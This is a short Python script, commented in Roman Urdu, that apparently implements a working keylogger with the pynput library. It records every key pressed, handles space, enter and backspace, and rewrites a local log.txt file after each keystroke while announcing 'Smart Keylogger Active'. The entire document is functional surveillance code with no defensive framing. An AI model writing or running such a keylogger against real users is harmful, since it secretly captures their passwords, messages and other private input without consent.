import pynput.keyboard

# Global list taake hum characters ko manage kar sakein
log_data = []

def write_to_file():
    # Puri list ko join karke file mein likhna
    with open("log.txt", "w") as f:
        f.write("".join(log_data))

def on_press(key):
    global log_data
    key_str = str(key).replace("'", "")

    if key_str == 'Key.space':
        log_data.append(' ')
    elif key_str == 'Key.enter':
        log_data.append('\n')
    elif key_str == 'Key.backspace':
        # Agar backspace dabayein toh pichla character delete kar dein
        if len(log_data) > 0:
            log_data.pop()
    elif "Key." in key_str:
        # Baqi keys (Shift, Ctrl, etc.) ko skip kar dein
        pass
    else:
        # Normal alphabet ya number ko add karein
        log_data.append(key_str)
    
    # Har key ke baad file update karein
    write_to_file()

print("--- Smart Keylogger Active ---")
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
